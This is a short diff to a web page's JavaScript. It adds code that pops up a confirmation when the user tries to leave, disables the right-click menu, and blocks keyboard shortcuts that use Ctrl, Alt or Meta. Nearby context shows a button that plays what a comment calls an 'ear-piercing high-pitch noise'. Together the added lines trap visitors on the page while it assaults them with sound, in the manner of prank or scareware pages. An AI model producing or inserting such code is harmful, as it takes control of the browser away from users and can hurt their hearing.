@@ -156,6 +156,23 @@
             }, 50);
         }
 
+        // Add confirmation dialog when trying to close main window
+        window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            e.returnValue = 'Are you sure you want to leave?';
+            return 'Are you sure you want to leave?';
+        });
+
+        // Prevent right-click on main window
+        document.addEventListener('contextmenu', e => e.preventDefault());
+
+        // Prevent keyboard shortcuts on main window
+        document.addEventListener('keydown', e => {
+            if(e.ctrlKey || e.altKey || e.metaKey) {
+                e.preventDefault();
+            }
+        });
+
         button.addEventListener('click', () => {
             // Play ear-piercing high-pitch noise
             playHighPitchNoise();
